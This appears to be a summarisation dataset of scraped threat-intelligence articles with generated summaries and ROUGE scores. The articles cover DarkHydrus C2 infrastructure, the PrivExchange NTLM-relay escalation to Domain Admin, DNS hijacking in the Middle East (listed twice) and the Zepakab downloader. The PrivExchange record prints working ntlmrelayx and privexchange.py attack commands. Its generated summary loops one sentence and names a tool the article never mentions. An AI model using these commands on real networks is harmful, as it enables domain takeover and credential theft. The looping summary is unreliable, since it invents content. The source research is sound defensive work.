consistent naming schema and structure in their infrastructure. They register a multitude of domains and set up nameservers to use as their primary DNS for their C2 domains.Figure 7 Relational diagram of DarkHydrus infrastructureFor this campaign, we are able to cluster the adversary infrastructure via the specific nameservers that were deployed for C2s. The brackets in Figure 7 shows the distinct clustering of infrastructure into three groups. We were able to retrieve live payloads associated with two of the clusters. A third cluster was also shared by ClearSky Security, but we were unable to associate a live payload to them. Although the third cluster does not appear to have any direct relationships to the other two clusters, it is still highly probable that this cluster is related to the two other clusters via the structuring of domains with custom nameservers. In addition, the domain names themselves were extremely similar, with some examples being exactly the same but on a different top level domain.The two sets of nameservers we were able to associate with the retrieved payloads were tbs1/tbs2.microsoftonline.services and tvs1/tvs2.trafficmanager.live. The distribution of C2 domains and their nameservers can be seen in Table 7.Sample(s) f1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0 5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c DNS tbs1/tbs2.microsoftonline.services Domains 0ffice365[.]agency 0ffice365[.]life 0ffice365[.]services 0nedrive[.]agency corewindows[.]agency microsoftonline[.]agency onedrive[.]agency sharepoint[.]agency skydrive[.]agency skydrive[.]services Sample eb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97 DNS tvs1/tvs2.trafficmanager.live Domains akamaiedge[.]live akamaized[.]live akdns[.]live edgekey[.]liveTable 7: Sample and Domain AssociationsThe third cluster of domains had six different nameservers associated with them, but unlike the other two clusters, were all directly tied to each other. Each of the domains appeared to have rotated through the six nameservers but oddly, one of the nameservers that several of the domains had rotated through did not appear to be currently registered. Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123. This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure. This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization's name.ConclusionThe DarkHydrus group continues their operations and adds new techniques to their playbook. Recent DarkHydrus delivery documents revealed the group abusing open-source penetration testing techniques such as the AppLocker bypass. The payloads installed by these delivery documents show that the DarkHydrus actors ported their previous PowerShell-based RogueRobin code to an executable variant, which is behavior that has been commonly observed with other adversary groups operating in the Middle East, such as OilRig. Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure.Palo Alto Networks customers are already be protected via:All samples in this report have a malicious verdict in WildFireDomains have been classified as maliciousAutoFocus tags are available for additional context: DarkHydrus and RogueRobinIndicators of CompromiseDelivery Document SHA256513813af1590bc9edeb91845b454d42bbce6a5e2d43a9b0afa7692e4e500b4c8e068c6536bf353abe249ad0464c58fb85d7de25223442dd220d64116dbf1e0224e40f80114e5bd44a762f6066a3e56ccdc0d01ab2a18397ea12e0bc5508215b8RogueRobin SHA256eb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97f1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db05cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479cRogueRobin C2sakdns[.]liveakamaiedge[.]liveedgekey[.]liveakamaized[.]live0ffice365[.]agency0nedrive[.]agencycorewindows[.]agencymicrosoftonline[.]agencyonedrive[.]agencysharepoint[.]agencyskydrive[.]agency0ffice365[.]life0ffice365[.]servicesskydrive[.]servicesskydrive[.]agencyNameserverstvs1.trafficmanager[.]livetvs2.trafficmanager[.]livetbs1.microsoftonline[.]servicestbs2.microsoftonline[.]servicesbrit.ns.cloudfronts[.]servicesdns.cloudfronts[.]servicesns2.akadns[.]servicesbritns.akadns[.]servicesbritns.akadns[.]livens2.akadns[.]liveRelated Domainsiecvlist-microsoft[.]livedata-microsoft[.]servicesasimov-win-microsoft[.]servicesonecs-live[.]servicesakamaiedge[.]servicesphicdn[.]worldazureedge[.]todaynsatc[.]agencyAkamai[.]agencyt-msedge[.]world";The DarkHydrus group has been using a consistent naming schema and structure in their infrastructure. They register a multitude of domains and set up nameservers to use as their primary DNS for their C2 domains. We were able to retrieve live payloads associated with two of the clusters. A third cluster was also shared by ClearSky Security, but we were unable to associate a live payload to them. Although the third cluster does not appear to have any direct relationships to the other two clusters, it is still highly probable that this cluster is related to the two other clusters via the structuring of domains with custom nameservers. In addition, the domain names themselves were extremely similar, with some examples being exactly the same but on a different top level domain. The distribution of C2 domains and their nameservers can be seen in Table 7. The DarkHydrus group continues their operations and adds new techniques to their playbook. Recent DarkHydrus delivery documents revealed the group abusing opensource penetration testing techniques such as the AppLocker bypass. The payloads installed by these delivery documents show that the DarkHydrus actors ported their previous PowerShellbased RogueRobin code to an executable variant, which is behavior that has been commonly observed with other adversary groups operating in the Middle East, such as OilRig. Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure.;en;{'r': 0.13309671694764863, 'p': 0.9868421052631579, 'f': 0.2345582465373591};{'r': 0.08596096096096097, 'p': 0.9662447257383966, 'f': 0.15787659277740052};{'r': 0.13309671694764863, 'p': 0.9868421052631579, 'f': 0.2345582465373591}
https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/;Abusing Exchange: One API call away from Domain Admin;"In most organisations using Active Directory and Exchange, Exchange servers have such high privileges that being an Administrator on an Exchange server is enough to escalate to Domain Admin. Recently I came across a blog from the ZDI, in which they detail a way to let Exchange authenticate to attackers using NTLM over HTTP. This can be combined with an NTLM relay attack to escalate from any user with a mailbox to Domain Admin in probably 90% of the organisations I've seen that use Exchange. This attack is possible by default and while no patches are available at the point of writing , there are mitigations that can be applied to prevent this privilege escalation. This blog details the attack, some of the more technical details and mitigations, as well as releasing a proof-of-concept tool for this attack which I've dubbed ""PrivExchange"". Update: Patches for PrivExchange are available, see the section ""Released updates"".Combining known vulnerabilities in a new wayThis blog combines a few known vulnerabilities and known protocol weaknesses into a new attack. There are 3 components which are combined to escalate from any user with a mailbox to Domain Admin access:Exchange Servers have (too) high privileges by defaultNTLM authentication is vulnerable to relay attacksExchange has a feature which makes it authenticate to an attacker with the computer account of the Exchange serverExchange and high privilegesThe main vulnerability here is that Exchange has high privileges in the Active Directory domain. The Exchange Windows Permissions group has WriteDacl access on the Domain object in Active Directory, which enables any member of this group to modify the domain privileges, among which is the privilege to perform DCSync operations. Users or computers with this privilege can perform synchronization operations that are normally used by Domain Controllers to replicate, which allows attackers to synchronize all the hashed passwords of users in the Active Directory. This has been covered by several researchers (see the references section at the end of this post), and I've written about it with my Fox-IT colleague Rindert last year. With that post I also released an update to ntlmrelayx that adds the possibility to perform these Access Control List (ACL) based attack while NTLM relaying.NTLM relaying machine accountsNTLM relaying has been around for a while. Previously, the main focus of this was relaying NTLM authentication over SMB in order to get code execution on other hosts. While this unfortunately remains a possibility in many company networks that are not hardened against this by enabling SMB signing, other protocols are also vulnerable to relaying. The most interesting protocol for this is, in my opinion, LDAP, which can be used to read and modify objects in the (Active) directory. If you need a refresher about NTLM relaying, you can read about it in a blog I wrote a while ago. The short version is that unless mitigations are applied, it is possible to pass authentication that is performed (automatically) by Windows when it connects to the attacker's machine on to other machines in the network, as is displayed in the image below:When authentication is relayed to LDAP, objects in the directory can be modified to grant an attacker privileges, including the privileges required for DCSync operations. Thus, if we can get an Exchange server to authenticate to us with NTLM authentication, we can perform the ACL attack. It should be noted that relaying to LDAP only works if the victim is authenticating to us over HTTP, not over SMB (see the section ""The technical bits"" for an explanation).Getting Exchange to authenticateThe only component that was missing until now was an easy way to get Exchange to authenticate to us. A ZDI researcher (who remains unnamed in their article) discovered that it is possible to get Exchange to authenticate to an arbitrary URL over HTTP via the Exchange PushSubscription feature. In their blog post they used this vulnerability to relay the NTLM authentication back to Exchange (this is called a reflection attack) and impersonate other users. If we instead combine this with the high privileges Exchange has by default and perform a relay attack instead of a reflection attack, we can use these privileges to grant ourselves DCSync rights. The push notification service has an option to send a message every X minutes (where X can be specified by the attacker), even if no event happened. This is something that ensures Exchange will connect to us even if there is no activity in an inbox.Performing the privilege escalation attackA schematic of the above attack is displayed below, showing the steps that are performed to escalate privileges:We need two tools to perform the attack, privexchange.py and ntlmrelayx . You can get both on GitHub in the PrivExchange and impacket repositories. Start ntlmrelayx in relay mode with LDAP on a Domain Controller as target, and supply a user under the attackers control to escalate privileges with (in this case the ntu user):ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntuNow we run the privexchange.py script:user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local Password: INFO: Using attacker URL: http://dev.testsegment.local/privexchange/ INFO: Exchange returned HTTP status 200 - authentication was OK ERROR: The user you authenticated with does not have a mailbox associated. Try a different user.When this is run with a user which doesn't have a mailbox, we will get the above error. Let's try it again with a user which does have a mailbox associated:user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u testuser -d testsegment.local Password: INFO: Using attacker URL: http://dev.testsegment.local/privexchange/ INFO: Exchange returned HTTP status 200 - authentication was OK INFO: API call was successfulAfter a minute (which is the value supplied for the push notification) we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges:We confirm the DCSync rights are in place with secretsdump:With all the hashed password of all Active Directory users, the attacker can create golden tickets to impersonate any user, or use any users password hash to authenticate to any service accepting NTLM or Kerberos authentication in the domain.The technical bits - relaying to LDAP and signingI mentioned previously that relaying from SMB to LDAP does not work, which is also why this attack can't be performed by using for example the SpoolService RPC abuse that was recently released (since this authenticates over SMB). Since questions about this keep coming up and there is a lot of confusion about this, let's look at why this is. If you aren't looking for a deep dive into NTLM authentication, feel free to skip this section :).The difference between NTLM authentication in SMB and HTTP lies in the flags that are negotiated by default. The problematic part is the NTLMSSP_NEGOTIATE_SIGN flag ( 0x00000010 ), documented in MS-NLMP section 2.2.2.5. NTLM authentication over HTTP does not set this flag by default, but if it is used over SMB this flag will be set by default:When we relay this to LDAP the authentication will succeed, but LDAP will expect all the messages to be signed with a session key derived from the password (which we don't have in a relay attack). It will thus ignore any messages without signature, causing our attack to fail. One may wonder if it is possible to modify these flags in transit, such that signing is not negotiated. This won't work on modern versions of Windows since they will include a MIC (Message Integrity Code) by default, which is a signature based on all 3 NTLM messages, so any modification in any of the messages will make it invalid.Can we remove the MIC? Well yes, we can, since it is not in a protected part of the NTLM message. There is however one last protection in NTLM authentication (NTLMv2 only) that prevents this: Deep within the NTLMv2 response, which is in itself signed with the victim's password, there is an AV_PAIR structure which is called MsvAvFlags . When this field has the value 0x0002 , it indicates that the client sent a MIC along with the type 3 message.Modifying the NTLMv2 response will invalidate the authentication, so we can't remove this flags field. The flag field indicates a MIC was calculated and included, which will make the target server validate the MIC, which in turn validates that all 3 messages were not modified in transit, and thus we can't remove the signing flag.This holds true for (I think) only the Microsoft implementation of NTLM. Custom appliances implementing NTLM most likely don't go down till the level of adding the MIC and AV_PAIR flags, making them vulnerable to flag modification and thus making SMB->LDAP relaying possible. An example of this is the Java implementation of NTLM, which can be modified in transit to bypass security measures.Performing the attack without any credentials altogetherIn the previous section we used compromised credentials to perform the first step of the attack. If an attacker is only in a position to perform a network attack, but doesn't have any credentials, it is still possible to trigger Exchange to authenticate. If we perform a SMB to HTTP (or HTTP to HTTP) relay attack (using LLMNR/NBNS/mitm6 spoofing) we can relay the authentication of a user in the same network segment to Exchange EWS and use their credentials to trigger the callback (thanks to Mark for bringing this up!). I've included a small modified httpattack.py which you can use with ntlmrelayx to perform the attack from a network perspective without any credentials (you just need to modify your attacker host since it is hard-coded in the file):MitigationsThis attack depends on various components to work. In previous blogs I've already highlighted several defences against NTLM relaying and against relaying to LDAP specifically.The most important mitigations applicable to this attack are:Remove the unnecessary high privileges that Exchange has on the Domain object by running setup.exe /PrepareAD from a patched Exchange CU (see below for more info).from a patched Exchange CU (see below for more info). Enable LDAP signing and enable LDAP channel binding to prevent relaying to LDAP and LDAPS respectivelyBlock Exchange servers from making connections to workstations on arbitrary ports.Enable Extended Protection for Authentication on the Exchange endpoints in IIS (but not the Exchange Back End ones, this will break Exchange). This will verify the channel binding parameters in the NTLM authentication, which ties NTLM authentication to a TLS connection and prevent relaying to Exchange web services.Remove the registry key which makes relaying back to the Exchange server possible, as discussed in Microsofts mitigation for CVE-2018-8518.Enforce SMB signing on Exchange servers (and preferable all other servers and workstations in the domain) to prevent cross-protocol relay attacks to SMB.If EWS push/pull subscriptions aren't used, they can be disabled by setting the EWSMaxSubscriptions to 0 with a throttling policy, as discovered by @gentilkiwi here. I haven't tested how much these are used by legitimate applications, so testing it with a small user scope is recommended.The proof-of concept tools can be found at https://github.com/dirkjanm/PrivExchange. They have been tested on the following Exchange/Windows versions:Exchange 2013 (CU21) on Server 2012R2, relayed to a Server 2016 DC (all fully patched)Exchange 2016 (CU11) on Server 2016, relayed to a Server 2019 DC (all fully patched)Exchange 2019 on Server 2019, relayed to a Server 2019 DC (thanks @gentilkiwi for testing)The above Exchange servers were installed using Shared permission mode (which is the default), but according to this write-up RBAC split permissions deployment is also vulnerable (I haven't personally tested this).Exchange 2010 SP3 seems to be not affected, in my lab this version negotiated signing similar to SMB as described above, which breaks the relaying attack (thanks to @lean0x2f for raising this). Both version 14.3.435.0 (latest update at the time of writing) and 14.3.123.4 show this behaviour.On February 12th 2019, Microsoft released updates for Exchange which resolve these issues by removing the automatic authentication Exchange performs when sending out notifications. This concerns the following Exchange versions:Exchange Server 2019 Cumulative Update 1Exchange Server 2016 Cumulative Update 12Exchange Server 2013 Cumulative Update 22Exchange Server 2010 Service Pack 3 Update Rollup 26Furthermore, they reviewed the required permissions for Exchange and decided to reduce them, so that Exchange no longer has excessively high privileges in AD. For existing Exchange installations, it is required to run Setup.exe /PrepareAD again from an updated installer, otherwise the privileges will not be removed. For Exchange 2010 the removal of privileges has to be performed manually, instructions are available in KB4490059.More information is available on the Microsoft Exchange blog about this patch.Resources / ReferencesThe following blogs, white papers and research offer more information about these attacks:Mitigation resourcesNTLM relaying/signing discussionsOther references";This blog combines a few known vulnerabilities and known protocol weaknesses into a new attack. There are 3 components which are combined to escalate from any user with a mailbox to Domain Admin access: Exchange Servers have (too) high privileges by default NTLM authentication is vulnerable to relay attacks Exchange has a feature which makes it authenticate to an attacker with the computer account of the Exchange server The technical bits relaying to LDAP and signing I mentioned previously that relaying from SMB to LDAP does not work, which is also why this attack can't be performed by using for example the SpoolService RPC abuse that was recently released (since this authenticates over SMB). The attack can also be performed without any credentials at all. This can be done by using a tool such as NTLM Relay Attack Tool (NRT), which can be used to perform the attack without any credentials at all. This tool can be used to perform the attack without any credentials at all. This can be done by using a tool such as NTLM Relay Attack Tool (NRT), which can be used to perform the attack without any credentials at all. This tool can be used to perform the attack without any credentials at all. This can be done by using a tool such as NTLM Relay Attack Tool (NRT), which can be used to perform the attack without any credentials at all. This tool can be used to perform the attack without any credentials at all. This can be done by using a tool such as NTLM Relay Attack Tool (NRT), which can be used to perform the attack without any credentials at all. This tool can be used to perform the attack without any credentials at all. This can be done by using;en;{'r': 0.12185929648241206, 'p': 0.941747572815534, 'f': 0.2157953261134792};{'r': 0.06435079726651481, 'p': 0.773972602739726, 'f': 0.1188222909064895};{'r': 0.12185929648241206, 'p': 0.941747572815534, 'f': 0.2157953261134792}
https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/;Widespread DNS Hijacking Activity Targets Multiple Sectors;"CrowdStrike(r) Intelligence(tm) has been researching reports of widespread DNS hijacking activity since information on the attacks became publicly available earlier this month.1 The information allowed for the discovery of at least a subset of domains affected by this campaign. CrowdStrike can confirm that numerous organizations in sectors such as government, insurance, and civilian aviation, as well as internet service providers (ISPs) and infrastructure providers, were affected going back as far as February 2017.The ultimate objective of this activity is currently unclear. However, DNS hijacking attacks would allow the responsible actors to capture the contents of web traffic to affected domains, during the time periods in which they were hijacked, and potentially use the captured data in follow-on operations. Given current information, CrowdStrike is unable to make adversary or country-level attribution of this activity.Malicious Infrastructure and Identified TargetsBased on available information, CrowdStrike's threat intelligence team has been able to identify 28 organizations in 12 different countries whose domains were hijacked. The organizations affected were primarily located in the Middle East and North Africa (MENA) region, but there was also a limited number of affected entities in Europe and the United States.TIMELINE OF MALICIOUS INFRASTRUCTURE AND HIJACKED DOMAINS Malicious IP Address Active Time Period Affected Organizations' Country (Sector) 142.54.179[.]69 February 2017 Jordan (Government) 89.163.206[.]26 February 2017 Jordan (Government) 185.15.247[.]140 December 2017 and January 2018 Kuwait (Government) Albania (Government) 146.185.143[.]158 August 2018 UAE (Government) 128.199.50[.]175 September 2018 UAE (Unidentified Sector) 185.20.187[.]8 September 2018 UAE (Law Enforcement) UAE (Government) Lebanon (Government) Lebanon (Civil Aviation) 82.196.8[.]43 October 2018 Iraq (Government) 188.166.119[.]57 October 2018 and November 2018 Egypt (Government) Libya (Government) 206.221.184[.]133 November 2018 Egypt (Government) 37.139.11[.]155 November 2018 UAE (Unidentified Sector) 199.247.3[.]191 November 2018 Iraq (Government) Albania (Government) 185.161.209[.]147 November 2018 Lebanon (Insurance) 139.162.144[.]139 December 2018 Jordan (Government) 37.139.11[.]155 December 2018 UAE (Unidentified Sector) 178.62.218[.]244 December 2018 UAE (Government) Cyprus (Government) 139.59.134[.]216 December 2018 Sweden (Internet Infrastructure) Saudi Arabia (Internet Services) Lebanon (Internet Services) 82.196.11[.]127 December 2018 Sweden (Internet Infrastructure) U.S. (Internet Infrastructure) 46.101.250[.]202 December 2018 and January 2019 Saudi Arabia (Government) Actor-owned Domains Used as Name Servers for Hijacked Infrastructure cloudipnameserver[.]comcloudnamedns[.]comlcjcomputing[.]commmfasi[.]cominteraland[.]comOnce hijacked, targeted domains ceased resolving to their normal IP addresses and began resolving to actor-controlled infrastructure. The actors would also create certificates for the domains, primarily through Let's Encrypt, a certificate authority that provides free X.509 certificates for TLS encryption. This would allow visitors to continue to establish trusted connections, despite the fact that they were pointing at malicious infrastructure. Available data shows that most affected domains were hijacked for very short periods of time, sometimes a day or less, with one domain showing resolutions to a malicious IP address for over a month.Internet Infrastructure Providers AffectedParticularly notable are a small number of domains owned by significant ISPs or infrastructure providers. The affected ISP domains belonged to a private entity appearing to provide services to a wide range of customers in all sectors, while another affected entity provided services to government, research and academic organizations within its own country.Two other affected organizations operate core functions of the internet globally, such as internet exchange points, root DNS servers and numerous top-level domains (TLDs). A compromise of internet infrastructure operators such as these could support data collection against a wide range of organizations.AssessmentWhile the precise objectives behind this DNS hijacking activity are unclear, this tactic could be used by malicious actors to support a number of missions:Direct collection of data from web traffic to affected domainsCollection of credentials from captured traffic for use in obtaining access to networks of future targetsDelivery of malware from actor-owned infrastructureThis activity was likely meant to support intelligence collection operations against the entities whose domains were hijacked and possibly associated organizations likely to visit those sites. In addition, the activity targeting the ISPs and infrastructure providers could potentially have supported information collection against a range of currently unidentified targets.Public reporting has indicated there are factors that point to a possible Iranian nexus for this activity. While the CrowdStrike Intelligence team agrees that the heavy focus on affected Middle Eastern governments would support the traditional intelligence collection interests of Iran, there is currently not enough information to make any definitive assessment around country or adversary-level attribution at this time.Finally, it should be noted that given current information, it is unclear if this hijacking activity is linked to one or multiple actors. Considering the extended period of time over which this activity took place and the variance in malicious infrastructure, it is possible that multiple entities were involved in carrying out this DNS hijacking.1. Information on related activity was also published in November 2018 in this blog: ""DNSpionage Campaign Targets Middle East.""Additional Resources";CrowdStrike(r) Intelligence(tm) has been researching reports of widespread DNS hijacking activity since information on the attacks became publicly available earlier this month.1 The information allowed for the discovery of at least a subset of domains affected by this campaign. CrowdStrike can confirm that numerous organizations in sectors such as government, insurance, and civilian aviation, as well as internet service providers (ISPs) and infrastructure providers, were affected going back as far as February 2017. The ultimate objective of this activity is currently unclear. However, DNS hijacking attacks would allow the responsible actors to capture the contents of web traffic to affected domains, during the time periods in which they were hijacked, and potentially use the captured data in followon operations. Given current information, CrowdStrike is unable to make adversary or countrylevel attribution of this activity.Malicious Infrastructure and Identified TargetsBased on available information, CrowdStrike's threat intelligence team has been able to identify 28 organizations in 12 different countries whose domains were hijacked. The organizations affected were primarily located in the Middle East and North Africa (MENA) region, but there was also a limited number of affected entities in Europe and the United States.TIMELINE OF MALICIOUS INFRASTRUCTURE AND HIJACKED DOMAINS Malicious IP Address Active Time Period Affected Organizations' Country (Sector) 142.54.179[. ]69 February 2017 Jordan (Government) 89.163.206[. ]26 February 2017 Jordan (Government) 185.15.247[. ]140 December;en;{'r': 0.37299771167048057, 'p': 0.9878787878787879, 'f': 0.5415282352233972};{'r': 0.2940379403794038, 'p': 0.9819004524886877, 'f': 0.452554740978709};{'r': 0.37299771167048057, 'p': 0.9878787878787879, 'f': 0.5415282352233972}
https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/;Widespread DNS Hijacking Activity Targets Multiple Sectors;"CrowdStrike(r) Intelligence(tm) has been researching reports of widespread DNS hijacking activity since information on the attacks became publicly available earlier this month.1 The information allowed for the discovery of at least a subset of domains affected by this campaign. CrowdStrike can confirm that numerous organizations in sectors such as government, insurance, and civilian aviation, as well as internet service providers (ISPs) and infrastructure providers, were affected going back as far as February 2017.The ultimate objective of this activity is currently unclear. However, DNS hijacking attacks would allow the responsible actors to capture the contents of web traffic to affected domains, during the time periods in which they were hijacked, and potentially use the captured data in follow-on operations. Given current information, CrowdStrike is unable to make adversary or country-level attribution of this activity.Malicious Infrastructure and Identified TargetsBased on available information, CrowdStrike's threat intelligence team has been able to identify 28 organizations in 12 different countries whose domains were hijacked. The organizations affected were primarily located in the Middle East and North Africa (MENA) region, but there was also a limited number of affected entities in Europe and the United States.TIMELINE OF MALICIOUS INFRASTRUCTURE AND HIJACKED DOMAINS Malicious IP Address Active Time Period Affected Organizations' Country (Sector) 142.54.179[.]69 February 2017 Jordan (Government) 89.163.206[.]26 February 2017 Jordan (Government) 185.15.247[.]140 December 2017 and January 2018 Kuwait (Government) Albania (Government) 146.185.143[.]158 August 2018 UAE (Government) 128.199.50[.]175 September 2018 UAE (Unidentified Sector) 185.20.187[.]8 September 2018 UAE (Law Enforcement) UAE (Government) Lebanon (Government) Lebanon (Civil Aviation) 82.196.8[.]43 October 2018 Iraq (Government) 188.166.119[.]57 October 2018 and November 2018 Egypt (Government) Libya (Government) 206.221.184[.]133 November 2018 Egypt (Government) 37.139.11[.]155 November 2018 UAE (Unidentified Sector) 199.247.3[.]191 November 2018 Iraq (Government) Albania (Government) 185.161.209[.]147 November 2018 Lebanon (Insurance) 139.162.144[.]139 December 2018 Jordan (Government) 37.139.11[.]155 December 2018 UAE (Unidentified Sector) 178.62.218[.]244 December 2018 UAE (Government) Cyprus (Government) 139.59.134[.]216 December 2018 Sweden (Internet Infrastructure) Saudi Arabia (Internet Services) Lebanon (Internet Services) 82.196.11[.]127 December 2018 Sweden (Internet Infrastructure) U.S. (Internet Infrastructure) 46.101.250[.]202 December 2018 and January 2019 Saudi Arabia (Government) Actor-owned Domains Used as Name Servers for Hijacked Infrastructure cloudipnameserver[.]comcloudnamedns[.]comlcjcomputing[.]commmfasi[.]cominteraland[.]comOnce hijacked, targeted domains ceased resolving to their normal IP addresses and began resolving to actor-controlled infrastructure. The actors would also create certificates for the domains, primarily through Let's Encrypt, a certificate authority that provides free X.509 certificates for TLS encryption. This would allow visitors to continue to establish trusted connections, despite the fact that they were pointing at malicious infrastructure. Available data shows that most affected domains were hijacked for very short periods of time, sometimes a day or less, with one domain showing resolutions to a malicious IP address for over a month.Internet Infrastructure Providers AffectedParticularly notable are a small number of domains owned by significant ISPs or infrastructure providers. The affected ISP domains belonged to a private entity appearing to provide services to a wide range of customers in all sectors, while another affected entity provided services to government, research and academic organizations within its own country.Two other affected organizations operate core functions of the internet globally, such as internet exchange points, root DNS servers and numerous top-level domains (TLDs). A compromise of internet infrastructure operators such as these could support data collection against a wide range of organizations.AssessmentWhile the precise objectives behind this DNS hijacking activity are unclear, this tactic could be used by malicious actors to support a number of missions:Direct collection of data from web traffic to affected domainsCollection of credentials from captured traffic for use in obtaining access to networks of future targetsDelivery of malware from actor-owned infrastructureThis activity was likely meant to support intelligence collection operations against the entities whose domains were hijacked and possibly associated organizations likely to visit those sites. In addition, the activity targeting the ISPs and infrastructure providers could potentially have supported information collection against a range of currently unidentified targets.Public reporting has indicated there are factors that point to a possible Iranian nexus for this activity. While the CrowdStrike Intelligence team agrees that the heavy focus on affected Middle Eastern governments would support the traditional intelligence collection interests of Iran, there is currently not enough information to make any definitive assessment around country or adversary-level attribution at this time.Finally, it should be noted that given current information, it is unclear if this hijacking activity is linked to one or multiple actors. Considering the extended period of time over which this activity took place and the variance in malicious infrastructure, it is possible that multiple entities were involved in carrying out this DNS hijacking.1. Information on related activity was also published in November 2018 in this blog: ""DNSpionage Campaign Targets Middle East.""Additional Resources";CrowdStrike(r) Intelligence(tm) has been researching reports of widespread DNS hijacking activity since information on the attacks became publicly available earlier this month.1 The information allowed for the discovery of at least a subset of domains affected by this campaign. CrowdStrike can confirm that numerous organizations in sectors such as government, insurance, and civilian aviation, as well as internet service providers (ISPs) and infrastructure providers, were affected going back as far as February 2017. The ultimate objective of this activity is currently unclear. However, DNS hijacking attacks would allow the responsible actors to capture the contents of web traffic to affected domains, during the time periods in which they were hijacked, and potentially use the captured data in followon operations. Given current information, CrowdStrike is unable to make adversary or countrylevel attribution of this activity.Malicious Infrastructure and Identified TargetsBased on available information, CrowdStrike's threat intelligence team has been able to identify 28 organizations in 12 different countries whose domains were hijacked. The organizations affected were primarily located in the Middle East and North Africa (MENA) region, but there was also a limited number of affected entities in Europe and the United States.TIMELINE OF MALICIOUS INFRASTRUCTURE AND HIJACKED DOMAINS Malicious IP Address Active Time Period Affected Organizations' Country (Sector) 142.54.179[. ]69 February 2017 Jordan (Government) 89.163.206[. ]26 February 2017 Jordan (Government) 185.15.247[. ]140 December;en;{'r': 0.37299771167048057, 'p': 0.9878787878787879, 'f': 0.5415282352233972};{'r': 0.2940379403794038, 'p': 0.9819004524886877, 'f': 0.452554740978709};{'r': 0.37299771167048057, 'p': 0.9878787878787879, 'f': 0.5415282352233972}
https://yoroi.company/research/sofacys-zepakab-downloader-spotted-in-the-wild/;Sofacy's Zepakab Downloader Spotted In-The-Wild;"In the last weeks, the Cybaze-Yoroi ZLAB investigated a new APT28 campaign discovered in January 2019. The sample has been initially identified by an Italian independent security researcher, who warned the InfoSec community and shared the binary for further analysis.Cybaze-Yoroi ZLab researchers analyzed this sample to extract indicators and investigate their presence into the Italian landscape.Technical AnalysisThe attack vector is still not clear, APT28 typically use decoy Office documents armed with VB macro. Anyway the analyzed sample pretends to mimic a Microsoft component called ""ServiceTray"".Sha256 e6e93c7744d20e2cac2c2b257868686c861d43c6cf3de146b8812778c8283f7d Threat Zepakab/Zebrocy Downloader ssdeep 12288:QYV6MorX7qzuC3QHO9FQVHPF51jgcSj2EtPo/V7I6R+Lqaw8i6hG0:vBXu9HGaVHh4Po/VU6RkqaQ6FAt first glance the executable shows it is packed using UPX v3.0 compressor, a widely known tool commonly used to minimize the PE file size.Figure 1. Info about malicious PE.Interestingly, the resource section of the executable shows a typical binary pattern of the AutoIt v3 compiled script: the ""AUT3!"" signature.Figure 2. Hexadecimal view reporting the AutoIt v3 header.After the decompilation and the extraction of the script we noticed the script looks simpler than expected: no obfuscation or anti-analysis tricks found.The usage of AutoIt language is an emerging characteristic of recent Zepakab downloaders, as also stated by Vitali Kremez, independent security researcher who compared this sample with the older Zepakab implant's version: the behavior and the script structure are very similar, but obviously the new sample use different command-and-controls servers and artifacts' names.Figure 3. Part of malicious decompiled AutoIt script.After statically setting some variables, such as the C2 url and the payload path, the script invokes the ""argv"" function calculating a 32 characters random ID.Figure 4. Function to craft a 32-chars random ID.Then, it runs the ""main"" routine. The core of Zepakab. Here the malware implements recon functionalities, retrieves machine information and grabs screenshot every minute.Figure 5. AutoIt script's main function.Then, all the information is encoded in Base64 and sent to the C2 through the ""connect"" function, using a SSL encrypted HTTP channel. Just before sending its message, the malware adds random padding characters, probably to prevent the automatic decoding of the message, the final request looks like this:Figure 6. POST request sent to C2C.The machine information sent to the C2 is gathered within the ""info"" function, invoking the ""_computergetoss"" routine. This last code snippet is likely borrowed from a publicly available AutoIT library script called ""CompInfo.au3"": an AutoIt interface to access the Windows Management Instrumentation framework's data.Figure 7. Function to retrieve information about victim's machine.The code analysis performed also identified another re-used snippet of script: the AutoIT WinHttp wrapper was included into the malicious sample to enable network communication through system proxy.Figure 8. Blog post reporting the Base64 script, shared by a forum user.Once communication channel has been established, the command and control analyzes the victim check-in information and, if the compromised machine is likely a target, it sends back the final payload.The payload will eventually be saved into ""C:\ProgramData\Windows\Microsoft\Settings\srhost.exe"" and executed inside the ""crocodile"" function.Figure 9. The ""crocodile"" function, used to launch the final payload.Once the final payload is correctly launched ($cr != 0), the function set the $call variable to False and the main loop of the script terminates.Unfortunately, the C2 destination is down at time of writing, so it was impossible to retrieve the final payload and proceed with in-depth analysis.ConclusionDespite its harmful capabilities, the AutoIt Zepakab malware is quite simple and surprisingly does not use any anti-analysis tricks. The Sofacy group borrowed code from publicly available scripts to ease the development of this new weapon in its arsenal and to keep a low profile in terms of TTP, building a cheap and effective info-stealer malware able to bypass traditional antivirus, almost effortless.CERT-Yoroi assessed no organization part of its constituency have been impacted by this threat.Indicator of CompromiseC2 hxxps://185.236.203.]53/locale/protocol/volume.phpPersistence ""C:\ProgramData\Windows\Microsoft\Settings\srhost.exe""Hashes e6e93c7744d20e2cac2c2b257868686c861d43c6cf3de146b8812778c8283f7d (UPX Packed) 88570857cd702409c712aa6e35513ea3a9de91ac42f8f1268faea46d34bc6874 